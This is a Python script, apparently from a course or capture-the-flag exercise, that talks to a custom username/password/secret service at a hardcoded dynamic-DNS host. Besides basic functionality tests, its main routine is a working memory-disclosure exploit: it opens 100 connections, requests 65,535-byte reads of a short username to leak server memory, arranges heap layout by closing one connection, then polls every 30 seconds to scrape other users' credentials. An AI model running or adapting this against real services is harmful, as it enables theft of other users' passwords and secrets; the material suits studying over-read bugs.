#!/usr/bin/env python3

from socket import *
import struct
import sys
import threading
import time
import os
import re


ADDR = 'reclass.ddns.net'
PORT = 7664


class ClientException(Exception):
    pass

class TestClient:
    def __init__(self, addr, port):
        self.s = socket()
        self.s.connect((addr, port))
        data = self.recv(1)
        if (data != struct.pack('<B', 5)):
            raise ClientException("Unexpected message: %r" % data)

    def recv(self, l):
        buf = b''
        while len(buf) < l:
            buf+= self.s.recv(l - len(buf))
        return buf
    
    def set_user(self, user):
        enc_user = user.encode() + b'\x00'
        self.s.send(struct.pack('<BH', 0, len(enc_user)) + enc_user)
        data = self.recv(1)
        if (data != struct.pack('<B', 6)):
            raise ClientException("Unexpected message: %r" % data)
        data = self.recv(len(enc_user))
        if (data != enc_user):
            raise ClientException("Username response mismatch: %r" % data)
        
    def get_user(self, size):
        self.s.send(struct.pack('<BH', 1, size))
        data = self.recv(1)
        if (data != struct.pack('<B', 6)):
            raise ClientException("Unexpected message: %r" % data)
        data = self.recv(size)
        return data

    def set_pass(self, password):
        enc_pass = password.encode() + b'\x00'
        self.s.send(struct.pack('<BH', 2, len(enc_pass)) + enc_pass)
        data = self.recv(1)
        if (data != struct.pack('<B', 8)):
            raise ClientException("Access denied")

    def authenticate(self, user, password):
        self.set_user(user)
        self.set_pass(password)

    def set_secret(self, secret):
        secret+= b'\x00'
        self.s.send(struct.pack('<BH', 3, len(secret)) + secret)
        data = self.recv(1)
        if (data != struct.pack('<B', 9)):
            raise ClientException("Unexpected message: %r" % data)

    def get_secret(self, size=0xffff):
        self.s.send(struct.pack('<BH', 4, size))
        data = self.recv(1)
        if (data != struct.pack('<B', 10)):
            raise ClientException("Unexpected message: %r" % data)
        data = self.recv(size)
        return data
    
    def test_get_user(self):
        user = "johndoe"
        password = "password"
        enc_user = user.encode() + b'\x00'
        enc_pass = password.encode() + b'\x00'
        self.s.send(struct.pack('<BH', 0, len(enc_user)) + enc_user)
        data = self.s.recv(1)
        if data != struct.pack('<B', 6):
            raise ClientException("Unexpected message: %r" % data)
        data = self.s.recv(len(enc_user))
        if data != enc_user:
            raise ClientException("Username response mismatch: %r" % data)

        # now try get_user
        get_size = 0xffff
        self.s.send(struct.pack('<BH', 1, get_size))
        data = self.s.recv(1)
        if data != struct.pack('<B', 6):
            raise ClientException("Unexpected message: %r" % data)
        data = self.s.recv(get_size)
        print("Before setting password:\n", data.decode('ascii', errors="replace"))

        self.s.send(struct.pack('<BH', 2, len(enc_pass)) + enc_pass)
        data = self.s.recv(1)
        if (data != struct.pack('<B', 8)):
            raise ClientException("Access denied")

        self.s.send(struct.pack('<BH', 1, get_size))
        data = self.s.recv(1)
        if data != struct.pack('<B', 6):
            raise ClientException("unexpected message: %r" % data)
        data = self.s.recv(get_size)
        print("after setting password:\n", data.decode('ascii', errors="replace"))

    def close(self):
        self.s.close()

    def __del__(self):
        self.close()


def testSetNoAuth():
    t = TestClient(ADDR, PORT)
    try:
        t.set_secret(b"This secret should never be stored")
        print("testSetNoAuth failed")
        return False
    except ClientException as e:
        print("testSetNoAuth passed: %r" % e)
        return True


def testGetNoAuth():
    t = TestClient(ADDR, PORT)
    try:
        data = t.get_secret()
        print("testGetNoAuth failed: %r" % data)
        return False
    except ClientException as e:
        print("testGetNoAuth passed: %r" % e)
        return True

def testAuthBad():
    t = TestClient(ADDR, PORT)
    try:
        t.authenticate("bob", "wrongpass")
        print("testAuthBad failed")
        return False
    except ClientException as e:
        print("testAuthBad passed: %r" % e)
        return True

def testAuthGood():
    t = TestClient(ADDR, PORT)
    try:
        t.authenticate("johndoe", "password")
        print("testAuthGood passed")
        t.close()
        return True
    except ClientException as e:
        print("testAuthGood failed: %r" % e)
        return False

TEST_SECRET = b"This is a really good secret"

def testSetAuth():
    t = TestClient(ADDR, PORT)
    t.authenticate("johndoe", "password")
    try:
        t.set_secret(TEST_SECRET)
        print("testSetAuth passed")
        return True
    except ClientException as e:
        print("testSetAuth failed: %r" % e)
        return False

def testGetAuth():
    t = TestClient(ADDR, PORT)
    t.authenticate("johndoe", "password")
    try:
        data = t.get_secret()
        if data[:len(TEST_SECRET)] == TEST_SECRET and set(data[len(TEST_SECRET):]) == set(b'\x00'):
            print("testGetAuth passed")
            return True
        else:
            print("testGetAuth failed: %r" % data[:100])
            return False
    except ClientException as e:
        print("testGetAuth failed: %r" % e)
        return False

def runTests():
    if not testSetNoAuth(): return -1
    if not testGetNoAuth(): return -1
    if not testAuthBad(): return -1
    if not testAuthGood(): return -1
    if not testSetAuth(): return -1
    if not testGetAuth(): return -1
    print("All tests passed successfully")
    return 0

def runExploit(thread):
    t = TestClient(ADDR, PORT)
    t.set_user('xxxx')
    data = t.get_user(0xffff)
    with open('data%d.bin'%thread, 'wb') as f:
        f.write(data)
    with open('data%d.bin'%thread, 'rb') as f:
        found_data = f.read().decode('ascii', errors="replace")
        strings = []
        for s in re.split(r'\W+', found_data):
            if (s != 'xxxx' and len(s) > 4):
                strings.append(s)
        if (len(strings) > 0):
            print(strings)
    os.remove('data%d.bin'%thread)


def findBots(bot, i):
    my_name = 'xxxx' + str(i)
    data = bot.get_user(0xffff)
    index= 0
    with open('data%d.bin' %i, 'wb') as f:
        f.write(data)
    with open('data%d.bin'%i, 'rb') as f:
        found_data = f.read().decode('ascii', errors="replace")
        strings = []
        for s in re.split(r'\W+', found_data):
            if ('xxxx' in s and s != my_name):
                s = s.replace('xxxx', "")
                strings.append(s)
        if (len(strings) > 0):
            print(strings)
            print("Bot ", i, " found ", strings)
            index = strings[0] 
    return index

def getCredentials(bot, i):
    my_name = 'xxxx' + str(i)
    data = bot.get_user(0xffff)
    with open('data%d.bin'%i, 'wb') as f:
        f.write(data)
    with open('data%d.bin'%i, 'rb') as f:
        found_data = f.read().decode('ascii', errors="replace")
        strings = []
        for s in re.split(r'\W+', found_data):
            if ('xxxx' not in s and len(s) > 4):
                strings.append(s)
        if (len(strings) > 0):
            print(strings)
            print("Bot ", i, " found possible credentials: ", strings)
    return strings


def main():
    num_bots = 100
    bots = []

    print("Connecting bots")
    for i in range(num_bots): #creating bots and connecting them
        bot = TestClient(ADDR, PORT)
        bot.set_user('xxxx'+str(i))
        bots.append(bot)


    print("Checking for bots close enough")
    index = 0
    for bot in bots:
        dump = findBots(bot, index) #finding anybots close enough
        print(dump)
        if(dump):
            print("Closing bot #",dump)
            bots[int(dump)].close() # close that bot
            closed = int(dump)
            break
        index += 1

    print("Waiting for user to connect")
    for i in range(20): #try finding the legitimate user 20 times
        print('Checking for credentials')
        time.sleep(30)
        index = 0
        for bot in bots:
            if(index != closed):
                dump = getCredentials(bot, index)

            index += 1






if __name__ == "__main__":
    main()
